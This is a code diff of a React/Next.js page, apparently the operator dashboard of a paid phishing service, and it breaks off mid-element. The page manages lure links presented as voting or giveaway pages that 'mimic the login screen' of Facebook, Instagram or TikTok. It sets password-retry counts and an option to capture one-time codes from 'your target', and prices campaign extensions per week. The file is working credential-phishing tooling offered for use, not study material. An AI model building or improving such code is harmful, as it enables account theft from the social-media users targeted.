@@ -4,119 +4,164 @@ import { useParams, useRouter } from 'next/navigation';
 import { useEffect, useState } from 'react';
 import { toast } from 'react-hot-toast';
 import { format } from 'date-fns';
-import { FaCopy } from 'react-icons/fa';
-import { platform } from 'process';
+import {
+  ClipboardDocumentIcon,
+  CheckCircleIcon,
+  XCircleIcon,
+  EyeIcon,
+  XMarkIcon,
+  CalendarDaysIcon,
+  TrophyIcon,
+  GiftIcon,
+  Cog6ToothIcon,
+} from '@heroicons/react/24/outline';
+import { CheckCircleIcon as CheckSolid } from '@heroicons/react/24/solid';
+import ImageUpload from '@/components/ImageUpload';
 
-interface Link {
-  _id: string;
+type SocialPlatform = 'facebook' | 'instagram' | 'tiktok';
+
+interface FormData {
   title: string;
-  url: string;
+  linkType: string;
   expiresAt: string;
-  userId: string;
-  linkId?: string;
-  type?: string;
+  linkName: string;
+  contestantName: string;
+  writeup: string;
+  image: string;
+  bannerImage: string;
+  linkId: string;
+  socialMedia: SocialPlatform[];
+  retry: number;
+  askForOtp: boolean;
+}
+
+const PLATFORM_LABELS: Record<SocialPlatform, string> = {
+  facebook: 'Facebook', instagram: 'Instagram', tiktok: 'TikTok',
+};
+
+const TYPE_META: Record<string, { icon: React.ElementType; color: string; label: string }> = {
+  voting:   { icon: TrophyIcon,    color: 'text-blue-500',   label: 'Voting' },
+  giveaway: { icon: GiftIcon,      color: 'text-green-500',  label: 'Giveaway' },
+  custom:   { icon: Cog6ToothIcon, color: 'text-purple-500', label: 'Custom' },
+};
+
+const DURATION_OPTIONS = [
+  { value: 1, label: '1 Week' },
+  { value: 2, label: '2 Weeks' },
+  { value: 4, label: '1 Month' },
+  { value: 8, label: '2 Months' },
+  { value: 12, label: '3 Months' },
+];
+
+function SectionHeader({ children }: { children: React.ReactNode }) {
+  return (
+    <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500 mb-3">
+      {children}
+    </p>
+  );
+}
+
+function HelperText({ children }: { children: React.ReactNode }) {
+  return <p className="text-xs text-gray-500 dark:text-gray-400 mt-1 leading-relaxed">{children}</p>;
 }
 
 export default function LinkDetails() {
   const params = useParams();
   const router = useRouter();
-  const [link, setLink] = useState<Link | null>(null);
-  const [isLoading, setIsLoading] = useState(false);
-  const [duration, setDuration] = useState(1);
-  const [pricePerWeek, setPricePerWeek] = useState(0);
-  const [formData, setFormData] = useState({
-    title: '',
-    type: '',
-    expiresAt: '',
-    linkType: '',
-    linkName: '',
-    contestantName: '',
-    writeup: '',
-    image: '',
-    bannerImage: '',
-    linkUrl: '',
-    linkId: '',
-    socialMedia: [],
-    retry: 1,
-    askForOtp: true,
+
+  const [isLoading, setIsLoading]   = useState(false);
+  const [isFetching, setIsFetching] = useState(true);
+  const [duration, setDuration]     = useState(1);
+  const [pricePerWeek, setPricePerWeek] = useState(4000);
+  const [showPreview, setShowPreview]   = useState(false);
+  const [copied, setCopied]             = useState(false);
+
+  const [formData, setFormData] = useState<FormData>({
+    title: '', linkType: '', expiresAt: '', linkName: '',
+    contestantName: '', writeup: '', image: '', bannerImage: '',
+    linkId: '', socialMedia: [], retry: 1, askForOtp: true,
   });
 
-  const socialLinkHostAddress = process.env.NEXT_PUBLIC_SOCIAL_LINK_HOST;
+  const host = process.env.NEXT_PUBLIC_SOCIAL_LINK_HOST?.trim() ?? '';
+  const linkUrl = `${host}/slink/${formData.linkId}`;
 
-
-
-  useEffect(() => {
-    fetchLinkDetails();
-  }, [params.id]);
+  useEffect(() => { fetchLinkDetails(); }, [params.id]);
 
   const fetchLinkDetails = async () => {
+    setIsFetching(true);
     try {
-      const response = await fetch(`/api/auth/links/${params.id}`);
-      if (!response.ok) throw new Error('Failed to fetch link details');
-      const data = await response.json();
+      const res  = await fetch(`/api/auth/links/${params.id}`);
+      if (!res.ok) throw new Error();
+      const data = await res.json();
 
-      const newFormData: any = {
-        title: data.title || '',
-        url: data.url || '',
-      };
+      if (data.linkType === 'scratch') {
+        router.replace(`/links/${params.id}/scratch`);
+        return;
+      }
 
-      if (data.type) newFormData.type = data.type;
-      if (data.expiresAt) newFormData.expiresAt = format(new Date(data.expiresAt), 'yyyy-MM-dd');
-      if (data.linkType) newFormData.linkType = data.linkType;
-      if (data.linkId) newFormData.linkId = data.linkId;
-      if (data.linkName) newFormData.linkName = data.linkName;
-      if (data.writeup) newFormData.writeup = data.writeup;
-      if (data.image) newFormData.image = data.image;
-      if (data.bannerImage) newFormData.bannerImage = data.bannerImage;
-      if (data.contestantName) newFormData.contestantName = data.contestantName;
-      if (data.linkUrl) newFormData.linkUrl = data.linkUrl;
-      if(data.socialMedia) newFormData.socialMedia = data.socialMedia;
-      if(data.retry) newFormData.retry = data.retry;
-      if(data.otpEnabled !== undefined) newFormData.askForOtp = data.otpEnabled;
+      const platforms: SocialPlatform[] = data.socialMedia ?? [];
+      if (platforms.length === 1) setPricePerWeek(4000);
+      if (platforms.length === 2) setPricePerWeek(6500);
+      if (platforms.length === 3) setPricePerWeek(9000);
 
-      if(data.socialMedia.length === 1) setPricePerWeek(4000);
-      if(data.socialMedia.length === 2) setPricePerWeek(6500);
-      if(data.socialMedia.length === 3) setPricePerWeek(9000);
-
-      setLink(data);
-      setFormData(newFormData);
-    } catch (error) {
+      setFormData({
+        title:          data.title          ?? '',
+        linkType:       data.linkType       ?? '',
+        expiresAt:      data.expiresAt ? format(new Date(data.expiresAt), 'yyyy-MM-dd') : '',
+        linkName:       data.linkName       ?? '',
+        contestantName: data.contestantName ?? '',
+        writeup:        data.writeup        ?? '',
+        image:          data.image          ?? '',
+        bannerImage:    data.bannerImage    ?? '',
+        linkId:         data.linkId         ?? '',
+        socialMedia:    platforms,
+        retry:          data.retry          ?? 1,
+        askForOtp:      data.otpEnabled     ?? true,
+      });
+    } catch {
       toast.error('Error fetching link details');
-      console.error(error);
+    } finally {
+      setIsFetching(false);
     }
   };
 
-  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
-    const { name, value } = e.target;
-    setFormData(prev => ({
-      ...prev,
-      [name]: value
-    }));
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(linkUrl);
+      setCopied(true);
+      toast.success('Link copied!');
+      setTimeout(() => setCopied(false), 2000);
+    } catch {
+      toast.error('Failed to copy');
+    }
   };
 
+  const handlePlatformToggle = (platform: SocialPlatform) => {
+    setFormData(prev => {
+      if (prev.socialMedia.includes(platform) && prev.socialMedia.length > 1) {
+        return { ...prev, socialMedia: prev.socialMedia.filter(p => p !== platform) };
+      } else if (!prev.socialMedia.includes(platform)) {
+        return { ...prev, socialMedia: [...prev.socialMedia, platform] };
+      }
+      return prev;
+    });
+  };
 
   const handleUpdate = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
     try {
-      const response = await fetch(`/api/auth/links/${params.id}`, {
+      const res  = await fetch(`/api/auth/links/${params.id}`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(formData),
       });
-      const data = await response.json();
-      if (!response.ok){
-        toast.error(data.error || 'Error updating link')
-        return;
-      };
-
+      const data = await res.json();
+      if (!res.ok) { toast.error(data.error || 'Error updating link'); return; }
       toast.success('Link updated successfully');
       fetchLinkDetails();
-    } catch (error) {
+    } catch {
       toast.error('Error updating link');
-      console.error(error);
     } finally {
       setIsLoading(false);
     }
@@ -126,28 +171,17 @@ export default function LinkDetails() {
     e.preventDefault();
     setIsLoading(true);
     try {
-      const response = await fetch(`/api/auth/links/${params.id}/extend`, {
+      const res  = await fetch(`/api/auth/links/${params.id}/extend`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          duration
-        }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ duration }),
       });
-      const data = await response.json();
-      if (!response.ok){
-        toast.error(data.error || 'Error Extending link')
-        return;
-      };
-
-      toast.success('Link Extended successfully');
+      const data = await res.json();
+      if (!res.ok) { toast.error(data.error || 'Error extending link'); return; }
+      toast.success('Link extended successfully');
       fetchLinkDetails();
-      // scroll to bottom
-      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-    } catch (error) {
-      toast.error('Error Extending link');
-      console.error(error);
+    } catch {
+      toast.error('Error extending link');
     } finally {
       setIsLoading(false);
     }
@@ -155,495 +189,308 @@ export default function LinkDetails() {
 
   const handleDelete = async () => {
     if (!confirm('Are you sure you want to delete this link?')) return;
-
     setIsLoading(true);
     try {
-      const response = await fetch(`/api/auth/links/${params.id}`, {
-        method: 'DELETE',
-      });
-
-      if (!response.ok) throw new Error('Failed to delete link');
-
-      toast.success('Link deleted successfully');
+      const res = await fetch(`/api/auth/links/${params.id}`, { method: 'DELETE' });
+      if (!res.ok) throw new Error();
+      toast.success('Link deleted');
       router.push('/links');
-    } catch (error) {
+    } catch {
       toast.error('Error deleting link');
-      console.error(error);
     } finally {
       setIsLoading(false);
     }
   };
 
-  if (!link) return <div className="p-4">Loading...</div>;
+  const pillCls = (active: boolean) =>
+    `px-4 py-2 rounded-full text-sm font-semibold transition-colors duration-150 ${
+      active
+        ? 'bg-primary-500 text-white'
+        : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
+    }`;
+
+  const inputCls = 'w-full px-3.5 py-2.5 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg text-sm text-gray-900 dark:text-white placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-primary-500/40 focus:border-primary-500 transition-all duration-150';
+
+  const typeMeta = TYPE_META[formData.linkType] ?? TYPE_META.custom;
+  const TypeIcon = typeMeta.icon;
+  const isExpired = formData.expiresAt ? new Date(formData.expiresAt) < new Date() : false;
+
+  if (isFetching) {
+    return (
+      <div className="flex justify-center items-center min-h-[60vh]">
+        <div className="w-10 h-10 border-4 border-primary-500/20 border-t-primary-500 rounded-full animate-spin" />
+      </div>
+    );
+  }
 
   return (
-    <div className="max-w-4xl mx-auto">
-      <div className="bg-gray-900 rounded-lg shadow-lg  p-6">
+    <div className="max-w-2xl mx-auto px-4 py-6 space-y-8">
 
-        <form onSubmit={handleExtend} className="space-y-6 max-w-2xl mx-auto border border-gray-800 rounded-xl py-4 px-2 mb-10">
-          <div className="bg-transparent ring-gray-900/5 rounded-xl py-4 px-2 space-y-6">
-              <h1 className="text-xl font-bold text-white my-2">
-                Extend Expiration Date
-              </h1>
-              <div>
-                <label className="block text-sm font-medium text-white mb-4">
-                  Extend Link expiration by:
-                </label>
-                <div className="flex flex-wrap gap-2">
-                  {[
-                    { value: 1, label: '1 Week' },
-                    { value: 2, label: '2 Weeks' },
-                    { value: 4, label: '1 Month' },
-                    { value: 8, label: '2 Months' },
-                    { value: 12, label: '3 Months' }
-                  ].map((option) => (
-                    <button
-                      key={option.value}
-                      type="button"
-                      onClick={() => setDuration(option.value)}
-                      className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
-                        ${duration === option.value
-                          ? 'bg-primary-400 text-black'
-                          : 'bg-gray-900 text-white hover:bg-gray-800'
-                        }`}
-                    >
-                      {option.label}
-                    </button>
-                  ))}
-              </div>
-            </div>
-            {/* Price Display */}
-            <div className="bg-gray-900/50 border border-primary-800 rounded-lg p-4">
-              <div className="flex justify-between items-center">
-                <span className="text-gray-400">Price</span>
-                <span className="text-xl font-semibold text-primary-400">
-                  ₦{(duration * pricePerWeek).toLocaleString()}
-                </span>
-              </div>
-            </div>
-        {/* Submit Button */}
-        <div className="mt-6 flex items-center justify-end gap-x-4">
-          <button
-            type="submit"
-            disabled={isLoading}
-            className="rounded-md bg-indigo-600 px-4 py-2 text-sm font-semibold text-white shadow-sm 
-                      hover:bg-indigo-500 
-                      focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600
-                      disabled:opacity-50 disabled:cursor-not-allowed
-                      transition-colors"
-          >
-            {isLoading ? (
-              <div className="flex items-center gap-2">
-                <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                </svg>
-                <span>Extending...</span>
-              </div>
-            ) : (
-              'Extend'
-            )}
-          </button>
-        </div>
-          </div>
-        </form>
-
-
-        <form onSubmit={handleUpdate} className="space-y-6 max-w-2xl mx-auto border border-gray-800 rounded-xl py-4 px-2">
-          <div className="bg-transparent ring-1 ring-gray-900/5 rounded-xl p-6 space-y-6">
-            <h1 className="text-xl font-bold text-white my-4">
-              Edit Link Details
+      {/* Header */}
+      <div className="flex items-start justify-between gap-3">
+        <div>
+          <div className="flex items-center gap-2 mb-0.5">
+            <TypeIcon className={`w-5 h-5 ${typeMeta.color}`} />
+            <h1 className="text-xl font-bold text-gray-900 dark:text-white">
+              {formData.linkName || 'Edit Link'}
             </h1>
-            {/* URL Input */}
+          </div>
+          <p className="text-xs text-gray-500 dark:text-gray-400">
+            {typeMeta.label} link
+            {formData.expiresAt && (
+              <> · <span className={isExpired ? 'text-red-500' : ''}>
+                {isExpired ? 'Expired' : `Expires ${format(new Date(formData.expiresAt), 'MMM d, yyyy')}`}
+              </span></>
+            )}
+          </p>
+        </div>
+        <button
+          type="button"
+          onClick={() => setShowPreview(true)}
+          className="shrink-0 flex items-center gap-1.5 px-3 py-2 bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 text-sm font-medium rounded-xl hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors"
+        >
+          <EyeIcon className="w-4 h-4" />
+          Preview
+        </button>
+      </div>
+
+      {/* Link URL */}
+      <div className="flex items-center gap-2 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl px-4 py-3">
+        <span className="text-xs text-gray-500 dark:text-gray-400 font-mono truncate flex-1">{linkUrl}</span>
+        <button
+          type="button"
+          onClick={handleCopy}
+          className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
+            copied ? 'bg-green-500 text-white' : 'bg-primary-500 hover:bg-primary-600 text-white'
+          }`}
+        >
+          {copied ? <><CheckSolid className="w-3.5 h-3.5" />Copied!</> : <><ClipboardDocumentIcon className="w-3.5 h-3.5" />Copy</>}
+        </button>
+      </div>
+
+      {/* ── Extend duration ── */}
+      <section>
+        <SectionHeader>Extend duration</SectionHeader>
+        <form onSubmit={handleExtend} className="border border-gray-200 dark:border-gray-700 rounded-xl p-4 space-y-4 bg-white dark:bg-gray-900">
+          <div className="flex flex-wrap gap-2">
+            {DURATION_OPTIONS.map(opt => (
+              <button key={opt.value} type="button" onClick={() => setDuration(opt.value)}
+                className={pillCls(duration === opt.value)}>{opt.label}</button>
+            ))}
+          </div>
+          <div className="flex items-center justify-between bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl px-4 py-3">
             <div>
-              <label 
-                htmlFor="url" 
-                className="text-sm font-medium leading-6 text-white flex items-center gap-2"
-                aria-required="true"
-              >
-                Phishing Linking
-                <svg className="h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-                  <path fillRule="evenodd" d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3c0-2.9-2.35-5.25-5.25-5.25zm3.75 8.25v-3a3.75 3.75 0 10-7.5 0v3h7.5z" clipRule="evenodd" />
-                </svg>
-              </label>
-              <div className="mt-2">
-                <div className="relative">
-                  <input
-                    type="url"
-                    id="url"
-                    name="url"
-                    value={`${socialLinkHostAddress?.trim()}/slink/${formData.linkId}`}
-                    disabled
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-200
-                             bg-gray-50
-                             cursor-not-allowed
-                             sm:text-sm sm:leading-6"
-                    placeholder="https://example.com"
-                    aria-describedby="url-description"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => {
-                      navigator.clipboard.writeText(`${socialLinkHostAddress?.trim()}/slink/${formData.linkId}`);
-                      toast.success('URL copied to clipboard');
-                    }}
-                    className="absolute inset-y-0 right-0 flex items-center px-3
-                             text-white hover:text-gray-600 transition-colors"
-                    aria-label="Copy URL to clipboard"
-                  >
-                    <FaCopy className="h-4 w-4" />
-                  </button>
-                </div>
-              </div>
-              <p className="mt-2 text-sm text-gray-500" id="url-description">
-                Copy the link and use a URL shortener to shorten it.
-              </p>
+              <p className="text-sm font-medium text-gray-700 dark:text-gray-300">Extension cost</p>
+              <p className="text-xs text-gray-500 dark:text-gray-400">Based on your current platform count</p>
             </div>
+            <span className="text-lg font-bold text-primary-500">₦{(duration * pricePerWeek).toLocaleString()}</span>
+          </div>
+          <button type="submit" disabled={isLoading}
+            className="w-full py-2.5 rounded-xl text-sm font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors disabled:opacity-40">
+            {isLoading ? 'Extending…' : 'Extend'}
+          </button>
+        </form>
+      </section>
 
+      {/* ── Edit form ── */}
+      <form onSubmit={handleUpdate} className="space-y-8">
+
+        {/* Section 1: Link details */}
+        <section className="space-y-4">
+          <SectionHeader>Link details</SectionHeader>
+
+          <div>
+            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Your reference name</label>
+            <input type="text" value={formData.linkName}
+              onChange={e => setFormData(p => ({ ...p, linkName: e.target.value }))}
+              className={inputCls} placeholder="e.g. John's voting campaign" maxLength={50} />
+            <HelperText>Only you see this — used to identify the link in your dashboard.</HelperText>
+          </div>
+
+          {formData.linkType === 'voting' && (
             <div>
-                <label 
-                  htmlFor="linkName" 
-                  className="block text-sm font-medium leading-6 text-white"
-                >
-                  Link Name
-                </label>
-                <div className="mt-2">
-                  <input
-                    type="text"
-                    id="linkName"
-                    name="linkName"
-                    value={formData.linkName}
-                    onChange={handleInputChange}
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-300 
-                             placeholder:text-white
-                             focus:ring-2 focus:ring-inset focus:ring-indigo-600
-                             hover:ring-gray-400
-                             transition-colors
-                             sm:text-sm sm:leading-6"
-                  />
-                </div>
-              </div>
+              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Contestant&apos;s name</label>
+              <input type="text" value={formData.contestantName}
+                onChange={e => setFormData(p => ({ ...p, contestantName: e.target.value }))}
+                className={inputCls} placeholder="e.g. Sarah Johnson" maxLength={50} />
+              <HelperText>This name appears on the voting page your target sees.</HelperText>
+            </div>
+          )}
 
-              {
-                (formData.linkType === 'custom' || formData.linkType === 'giveaway')
-                &&
-                <div>
-                <label 
-                  htmlFor="title" 
-                  className="block text-sm font-medium leading-6 text-white"
-                  aria-required="true"
-                >
-                  Title
-                </label>
-                <div className="mt-2">
-                  <input
-                    type="text"
-                    id="title"
-                    name="title"
-                    value={formData.title}
-                    onChange={handleInputChange}
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-300 
-                             placeholder:text-white
-                             focus:ring-2 focus:ring-inset focus:ring-indigo-600
-                             hover:ring-gray-400
-                             transition-colors
-                             sm:text-sm sm:leading-6"
-                    required
-                    placeholder="Enter title"
-                    aria-describedby="title-description"
-                  />
-                </div>
-                <p className="mt-2 text-sm text-gray-500" id="title-description">
-                  A clear and descriptive title for your link
-                </p>
-              </div>
-              }
+          {(formData.linkType === 'giveaway' || formData.linkType === 'custom') && (
+            <div>
+              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Page title</label>
+              <input type="text" value={formData.title}
+                onChange={e => setFormData(p => ({ ...p, title: e.target.value }))}
+                className={inputCls} placeholder="e.g. You've been selected!" maxLength={100} />
+              <HelperText>The headline shown at the top of the page your target sees.</HelperText>
+            </div>
+          )}
 
-              <div>
-                <label 
-                  htmlFor="image" 
-                  className="block text-sm font-medium leading-6 text-white"
-                >
-                  Image URL
-                </label>
-                <div className="mt-2">
-                  <input
-                    type="url"
-                    id="image"
-                    name="image"
-                    value={formData.image}
-                    onChange={handleInputChange}
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-300 
-                             placeholder:text-white
-                             focus:ring-2 focus:ring-inset focus:ring-indigo-600
-                             hover:ring-gray-400
-                             transition-colors
-                             sm:text-sm sm:leading-6"
-                    placeholder="https://example.com/image.jpg"
-                  />
-                </div>
-              </div>
-
-              {
-                (formData.linkType === 'voting' || formData.linkType === 'giveaway')
-                &&<div>
-                <label 
-                  htmlFor="bannerImage" 
-                  className="block text-sm font-medium leading-6 text-white"
-                >
-                  Banner Image URL
-                </label>
-                <div className="mt-2">
-                  <input
-                    type="url"
-                    id="bannerImage"
-                    name="bannerImage"
-                    value={formData.bannerImage}
-                    onChange={handleInputChange}
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-300 
-                             placeholder:text-white
-                             focus:ring-2 focus:ring-inset focus:ring-indigo-600
-                             hover:ring-gray-400
-                             transition-colors
-                             sm:text-sm sm:leading-6"
-                    placeholder="https://example.com/image.jpg"
-                  />
-                </div>
-              </div>
-              }
-
-              {
-                (formData.linkType === 'voting')
-                &&               <div>
-                <label 
-                  htmlFor="contestantName" 
-                  className="block text-sm font-medium leading-6 text-white"
-                >
-                  Contestant Name
-                </label>
-                <div className="mt-2">
-                  <input
-                    type="text"
-                    id="contestantName"
-                    name="contestantName"
-                    value={formData.contestantName}
-                    onChange={handleInputChange}
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-300 
-                             placeholder:text-white
-                             focus:ring-2 focus:ring-inset focus:ring-indigo-600
-                             hover:ring-gray-400
-                             transition-colors
-                             sm:text-sm sm:leading-6"
-                  />
-                </div>
-              </div>
-              }
-
-              <div>
-                <label 
-                  htmlFor="linkType" 
-                  className="block text-sm font-medium leading-6 text-white flex items-center gap-2"
-                >
-                  Link Type
-                  <svg className="h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-                    <path fillRule="evenodd" d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3c0-2.9-2.35-5.25-5.25-5.25zm3.75 8.25v-3a3.75 3.75 0 10-7.5 0v3h7.5z" clipRule="evenodd" />
-                  </svg>
-                </label>
-                <div className="mt-2 relative">
-                  <input
-                    type="text"
-                    id="linkType"
-                    name="linkType"
-                    value={formData.linkType}
-                    disabled
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-200
-                             bg-gray-50
-                             cursor-not-allowed
-                             sm:text-sm sm:leading-6"
-                  />
-                </div>
-              </div>
-
-              <div>
-                <label 
-                  htmlFor="writeup" 
-                  className="block text-sm font-medium leading-6 text-white"
-                >
-                  Write-up
-                </label>
-                <div className="mt-2">
-                  <textarea
-                    id="writeup"
-                    name="writeup"
-                    value={formData.writeup}
-                    onChange={handleInputChange}
-                    rows={4}
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-300 
-                             placeholder:text-white
-                             focus:ring-2 focus:ring-inset focus:ring-indigo-600
-                             hover:ring-gray-400
-                             transition-colors
-                             resize-y min-h-[100px]
-                             sm:text-sm sm:leading-6"
-                  />
-                </div>
-              </div>
-
-              <div>
-                <label 
-                  htmlFor="expiresAt" 
-                  className="block text-sm font-medium leading-6 text-white flex items-center gap-2"
-                >
-                  Expires At
-                  <svg className="h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
-                    <path fillRule="evenodd" d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3c0-2.9-2.35-5.25-5.25-5.25zm3.75 8.25v-3a3.75 3.75 0 10-7.5 0v3h7.5z" clipRule="evenodd" />
-                  </svg>
-                </label>
-                <div className="mt-2 relative">
-                  <input
-                    type="date"
-                    id="expiresAt"
-                    name="expiresAt"
-                    value={formData.expiresAt}
-                    disabled
-                    className="block w-full rounded-md border-0 px-3 py-3 text-gray-900 shadow-sm 
-                             ring-1 ring-inset ring-gray-200
-                             bg-gray-50
-                             cursor-not-allowed
-                             sm:text-sm sm:leading-6"
-                  />
-                </div>
-              </div>
-
-              {/* Ask for OTP */}
-              <div>
-                <label className="block text-sm font-medium text-gray-400 mb-2">
-                  Ask for OTP
-                </label>
-                <div className="flex gap-2">
-                  {[
-                    { value: true, label: 'Yes' },
-                    { value: false, label: 'No' }
-                  ].map((option) => (
-                    <button
-                      key={option.label}
-                      type="button"
-                      onClick={() => setFormData(prev => ({ ...prev, askForOtp: option.value }))}
-                      className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
-                        ${formData.askForOtp === option.value
-                          ? 'bg-primary-400 text-black'
-                          : 'bg-gray-900 text-white hover:bg-gray-800'
-                        }`}
-                    >
-                      {option.label}
-                    </button>
-                  ))}
-                </div>
-              </div>
-
-              {/* Number of Password Retries */}
-              <div>
-                <label className="block text-sm font-medium text-gray-400 mb-2">
-                  Number of Password Retries
-                </label>
-                <div className="flex gap-2">
-                  {[1, 2, 3].map((value) => (
-                    <button
-                      key={value}
-                      type="button"
-                      onClick={() => setFormData(prev => ({ ...prev, retry: value }))}
-                      className={`px-4 py-2 rounded-full text-sm font-medium transition-colors duration-200
-                        ${formData.retry === value
-                          ? 'bg-primary-400 text-black'
-                          : 'bg-gray-900 text-white hover:bg-gray-800'
-                        }`}
-                    >
-                      {value}
-                    </button>
-                  ))}
-                </div>
-              </div>
-
-            {/* Submit Button */}
-            <div className="mt-6 flex items-center justify-end gap-x-4">
-              <button
-                type="button"
-                onClick={() => router.push('/links')}
-                className="text-sm font-semibold leading-6 text-gray-900 hover:text-gray-700 transition-colors"
-              >
-                Cancel
-              </button>
-              <button
-                type="submit"
-                disabled={isLoading}
-                className="rounded-md bg-indigo-600 px-4 py-2 text-sm font-semibold text-white shadow-sm 
-                         hover:bg-indigo-500 
-                         focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600
-                         disabled:opacity-50 disabled:cursor-not-allowed
-                         transition-colors"
-              >
-                {isLoading ? (
-                  <div className="flex items-center gap-2">
-                    <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    <span>Saving...</span>
-                  </div>
-                ) : (
-                  'Save Changes'
-                )}
-              </button>
+          <div>
+            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Description</label>
+            <textarea value={formData.writeup} rows={4}
+              onChange={e => setFormData(p => ({ ...p, writeup: e.target.value }))}
+              className={inputCls} placeholder="A short message shown on the page." maxLength={500} />
+            <div className="flex justify-between">
+              <HelperText>Shown on the page as supporting text.</HelperText>
+              <span className="text-xs text-gray-400 mt-1">{formData.writeup.length}/500</span>
             </div>
           </div>
-        </form>
+        </section>
 
+        {/* Section 2: Images */}
+        <section className="space-y-4">
+          <SectionHeader>Images</SectionHeader>
+          <ImageUpload label="Main image" required value={formData.image}
+            onChange={url => setFormData(p => ({ ...p, image: url }))}
+            hint="The profile or contestant photo shown on the page." />
+          {(formData.linkType === 'voting' || formData.linkType === 'giveaway') && (
+            <ImageUpload label="Banner image" required value={formData.bannerImage}
+              onChange={url => setFormData(p => ({ ...p, bannerImage: url }))}
+              hint="Wide header image shown at the top of the page." />
+          )}
+        </section>
 
-      
+        {/* Section 3: Platforms & security */}
+        <section className="space-y-5">
+          <SectionHeader>Platforms &amp; security</SectionHeader>
 
+          <div>
+            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Target platforms</label>
+            <HelperText>The page will mimic the login screen of the selected platform(s).</HelperText>
+            <div className="flex flex-wrap gap-2 mt-2.5">
+              {(['facebook', 'instagram', 'tiktok'] as SocialPlatform[]).map(p => (
+                <button key={p} type="button" onClick={() => handlePlatformToggle(p)}
+                  className={pillCls(formData.socialMedia.includes(p))}>
+                  {PLATFORM_LABELS[p]}
+                </button>
+              ))}
+            </div>
+          </div>
 
-        <div className="mt-8 pt-6 border-t border-gray-700">
-          <h2 className="text-lg font-medium text-gray-300 mb-4">Danger Zone</h2>
-          <div className="bg-gray-800 rounded-lg p-4 border border-red-800">
-            <div className="flex flex-col items-center justify-between">
-              <div>
-                <h3 className="text-sm font-medium text-white mb-4">Delete this link</h3>
-                <p className="text-sm text-white mt-1">
-                  Once you delete a link, there is no going back. Please be certain.
-                </p>
-              </div>
-              <button
-                onClick={handleDelete}
